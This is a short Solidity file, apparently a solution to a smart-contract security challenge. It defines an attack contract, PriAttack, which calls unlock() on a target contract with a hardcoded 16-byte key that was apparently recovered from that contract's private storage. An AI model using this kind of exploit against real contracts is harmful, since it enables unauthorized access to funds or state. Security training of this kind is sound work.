// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntPri {
    function unlock(bytes16 _key) external;
}

contract PriAttack {
    IntPri public pri;

    constructor(address target) {
        pri = IntPri(target);
    }

    function callUnlock() public {
        bytes16 key = bytes16(0x6719462763286ef25b3a287a6b5838d8);
        pri.unlock(key);
    }
}
